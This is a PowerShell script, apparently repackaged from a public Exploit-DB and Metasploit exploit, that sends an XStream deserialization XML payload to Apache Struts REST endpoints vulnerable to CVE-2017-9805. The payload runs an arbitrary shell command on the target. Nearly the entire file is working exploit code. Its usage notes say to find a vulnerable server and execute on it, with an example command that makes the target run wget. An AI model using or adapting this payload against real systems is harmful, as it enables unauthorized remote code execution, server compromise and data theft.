function invoke-strutsRestXMLRCE {
<#
.SYNOPSIS
This is a scipt that will perform remote code execution on servers vulnerable to Apache Struts CVE-2017-9805. Exploit was pulled and re-packed into PowerShell using the Exploit from the Exploit-DB and Metasploit, https://www.exploit-db.com/exploits/42627/. When this runs you will not get confirmation or output returned from the command. If you recieved a 500 internal server error, there is a good chance the code executed.
.DESCRIPTION
.__                   __                              __                 __         __________                 __ ____  ___  _____  .____   ___________________ ___________
|__| _______  ______ |  | __ ____             _______/  |________ __ ___/  |_  _____\______   \ ____   _______/  |\   \/  / /     \ |    |  \______   \_   ___ \\_   _____/
|  |/    \  \/ /  _ \|  |/ // __ \   ______  /  ___/\   __\_  __ \  |  \   __\/  ___/|       _// __ \ /  ___/\   __\     / /  \ /  \|    |   |       _/    \  \/ |    __)_ 
|  |   |  \   (  <_> )    <\  ___/  /_____/  \___ \  |  |  |  | \/  |  /|  |  \___ \ |    |   \  ___/ \___ \  |  | /     \/    Y    \    |___|    |   \     \____|        \
|__|___|  /\_/ \____/|__|_ \\___  >         /____  > |__|  |__|  |____/ |__| /____  >|____|_  /\___  >____  > |__|/___/\  \____|__  /_______ \____|_  /\______  /_______  /
        \/                \/    \/               \/                               \/        \/     \/     \/            \_/       \/        \/      \/        \/        \/
Locate a server running a vulnerable version of Apache Struts and then execute on that web application.

.EXAMPLE
invoke-strutshell -URL http://192.168.239.129/orders -CMD "wget http://netcat"

.NOTES
All commands must containing spaces musted be enclosed in quotes. 

#>

param( $URL, $CMD )

$payload = '<map>'
$payload += '<entry>'
$payload += '<jdk.nashorn.internal.objects.NativeString>'
$payload += '<flags>0</flags>'
$payload += '<value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">'
$payload += '<dataHandler>'
$payload += '<dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">'
$payload += '<is class="javax.crypto.CipherInputStream">'
$payload += '<cipher class="javax.crypto.NullCipher">'
$payload += '<initialized>false</initialized>'
$payload += '<opmode>0</opmode>'
$payload += '<serviceIterator class="javax.imageio.spi.FilterIterator">'
$payload += '<iter class="javax.imageio.spi.FilterIterator">'
$payload += '<iter class="java.util.Collections$EmptyIterator"/>'
$payload += '<next class="java.lang.ProcessBuilder">'
$payload += '<command>'
$payload += '<string>/bin/sh</string><string>-c</string><string>sh -c '
$payload += ''''
$payload += "($($cmd))"
$payload += ''''
$payload += ' </string>'
$payload += '</command>'
$payload += '<redirectErrorStream>false</redirectErrorStream>'
$payload += '</next>'
$payload += '</iter>'
$payload += '<filter class="javax.imageio.ImageIO$ContainsFilter">'
$payload += '<method>'
$payload += '<class>java.lang.ProcessBuilder</class>'
$payload += '<name>start</name>'
$payload += '<parameter-types/>'
$payload += '</method>'
$payload += '<name>foo</name>'
$payload += '</filter>'
$payload += '<next class="string">foo</next>'
$payload += '</serviceIterator>'
$payload += '<lock/>'
$payload += '</cipher>'
$payload += '<input class="java.lang.ProcessBuilder$NullInputStream"/>'
$payload += '<ibuffer/>'
$payload += '<done>false</done>'
$payload += '<ostart>0</ostart>'
$payload += '<ofinish>0</ofinish>'
$payload += '<closed>false</closed>'
$payload += '</is>'
$payload += '<consumed>false</consumed>'
$payload += '</dataSource>'
$payload += '<transferFlavors/>'
$payload += '</dataHandler>'
$payload += '<dataLen>0</dataLen>'
$payload += '</value>'
$payload += '</jdk.nashorn.internal.objects.NativeString>'
$payload += '<jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>'
$payload += '</entry>'
$payload += '<entry>'
$payload += '<jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>'
$payload += '<jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>'
$payload += '</entry>'
$payload += '</map>'

Invoke-RestMethod -Method Post -Uri $url -ContentType 'application/xml' -Body $payload
Write-Output "You will not get confirmation or return output when you run this code. If you recieve a (500) Internal Server Error then your exploit might have worked"

}